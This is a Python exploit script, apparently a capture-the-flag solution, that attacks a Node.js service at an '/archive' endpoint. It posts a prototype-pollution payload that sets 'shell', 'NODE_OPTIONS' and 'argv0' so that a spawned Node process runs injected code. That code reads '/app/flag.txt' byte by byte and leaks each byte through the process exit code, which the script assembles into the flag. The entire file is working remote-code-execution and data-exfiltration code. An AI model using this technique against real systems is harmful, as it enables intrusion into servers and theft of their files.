import requests
import sys

url = "http://backup.cfire:3000/archive"
headers = {"Content-Type": "application/json"}
flag = ""

print("[*] Flag: ", end="")

# Loop through character indices (assume flag is < 100 chars)
for i in range(100):
    payload = {
        "constructor": {
            "prototype": {
                "shell": "/proc/self/exe",
                "NODE_OPTIONS": "--require /proc/self/cmdline",
                # Inject the current index 'i' into the payload
                "argv0": f"process.exit(require('fs').readFileSync('/app/flag.txt')[{i}]);//"
            }
        }
    }
    try:
        r = requests.post(url, json=payload, headers=headers)
        data = r.json()
        code = data.get("systemCode")
        # If we hit the end of the file or an error, Node usually exits with 0, 1, or undefined

        if code is None or code == 0:
            break

        char = chr(code)
        flag += char
        sys.stdout.write(char)
        sys.stdout.flush()
        # Stop if we hit the closing brace
        if char == '}':
           break
    except Exception as e:
        print(f"\n[-] Request failed: {e}")
        break

print(f"\n\n[+] Full Flag Extracted: {flag}")